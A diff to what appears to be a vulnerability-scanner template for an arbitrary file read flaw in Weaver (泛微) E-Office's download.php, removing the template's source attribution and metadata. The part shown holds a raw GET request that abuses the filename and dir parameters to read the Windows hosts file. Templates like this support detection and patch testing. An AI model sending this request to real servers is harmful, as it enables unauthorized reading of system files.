@@ -3,12 +3,8 @@ info:
   name: 泛微 E-Office download.php 任意文件读取漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/stpwvxure5rpem64'
+  description: ''
   tags: lfi,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: stpwvxure5rpem64
-    fofa: 暂无
 http:
 - raw:
   - 'GET /general/file_folder/file_new/neworedit/download.php?filename=hosts&dir=C:\\Windows\\System32\\drivers\\etc\\ HTTP/1.1
